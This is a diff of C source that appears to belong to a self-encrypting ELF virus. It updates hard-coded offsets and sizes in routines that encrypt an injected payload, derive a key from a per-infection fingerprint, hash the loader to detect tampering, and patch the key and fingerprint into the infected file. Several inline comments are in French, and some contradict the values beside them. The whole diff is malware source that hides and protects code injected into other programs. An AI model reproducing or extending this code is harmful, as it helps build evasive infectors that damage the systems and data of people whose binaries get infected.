@@ -5,13 +5,13 @@ uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
 	uint32_t    *file;
 	uint32_t    key;
 	size_t      i;  
-	uint32_t start = info->addr_bis + /*B*/0x1a8/*B`*/;
+	uint32_t start = info->addr_bis + /*B*/0x1c4/*B`*/;
 	uint32_t end = (int32_t)(info->addr_bis + BIS_SIZE + MAIN_OFFSET);
 
 	file = (uint32_t *)ptr;
 	key = end - start; // key is now offset to jump payload from loader
 	key += fingerprint;
-	ft_memcpy(info->file + info->offset_bis + /*D*/0x17d/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
+	ft_memcpy(info->file + info->offset_bis + /*D*/0x199/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
 	int nb = 0;
 	size = (size / 4 ) * 4;
 	while (nb < 8)
@@ -37,10 +37,10 @@ uint32_t	hash_loader(t_info *info)
 	size_t		i = 0;
 
 	str = (unsigned char *)(info->text_begin + info->text_size);
-	size = /*F*/0x10/*F`*/; //a modifier taille du loader 0xc5 (0xca - 5)
+	size = /*F*/0xc5/*F`*/; //a modifier taille du loader 0xc5 (0xca - 5)
 	while (i < size)
 	{
-		if (i < /*G*/0x9d/*G`*/ || i > /*G2*/0xa1/*G2`*/) //a modifier debut et fin pos adresse apres pos_rdi dans loader
+		if (i < /*G*/0xb5/*G`*/ || i > /*G2*/0xb9/*G2`*/) //a modifier debut et fin pos adresse apres pos_rdi dans loader
 			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
@@ -48,11 +48,11 @@ uint32_t	hash_loader(t_info *info)
 	patch_loader(info, hash);
 	reencrypt_func(info, &patch_loader, info->tab_addr[14] - info->tab_addr[13], key);
 	str = (unsigned char *)(info->file + info->offset_bis);
-	size = 0x10; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
+	size = 0x44d; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
 	i = 0;
 	while (i < size)
 	{
-		if (i < /*H*/0x109/*H`*/ || i > /*H2*/0x10d/*H2`*/) // modifier debut et fin pos adresse apres ... dans bis
+		if (i < /*H*/0x11f/*H`*/ || i > /*H2*/0x123/*H2`*/) // modifier debut et fin pos adresse apres ... dans bis
 			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
@@ -142,7 +142,7 @@ void		patch_key(t_info *info, uint32_t key)
 	hash = hash_loader(info);
 	// Key in loader
 	val = key - hash;
-	ft_memcpy(info->file + info->offset_bis + /*C*/0x109/*C`*/, &val, 4); // 0x78 is addr of key in bis
+	ft_memcpy(info->file + info->offset_bis + /*C*/0x11f/*C`*/, &val, 4); // 0x78 is addr of key in bis
 }
 
 void		save_key(t_info *info, uint32_t hash, int nb)
@@ -164,13 +164,13 @@ void		crypt_payload(t_info *info, uint32_t fingerprint)
 	// decrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], x);
 	// reencrypt_func(info, &, info->tab_addr[x + 1] - info->tab_addr[x], key);
 
-	while (i <= 29)
+	while (i <= 31)
 	{
-		if (i != 20 && i != 21 && i != 22 && i != 23 && i != 29)
+		if (i != 22 && i != 23 && i != 24 && i != 25 && i != 31)
 		{
 			size = info->tab_addr[i + 1] - info->tab_addr[i];
 			offset = info->tab_addr[i] - (size_t)(&ft_memcpy);
-			if (i != 26 && i != 28)
+			if (i != 28 && i != 30)
 				decrypt_func(info, info->file + info->offset_bis + BIS_SIZE + offset, size, i);
 			hash = hash_func((void *)(info->tab_addr[i]), size, fingerprint);
 			hash = encrypt_func(info->file + info->offset_bis + BIS_SIZE + offset, size, hash);
